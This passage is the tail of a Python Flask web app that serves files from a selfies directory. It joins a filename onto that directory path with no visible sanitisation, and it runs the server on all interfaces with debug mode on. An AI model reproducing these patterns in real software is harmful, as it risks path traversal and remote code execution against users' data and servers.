    return send_file(os.path.join(SELFIES_DIR, filename))

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)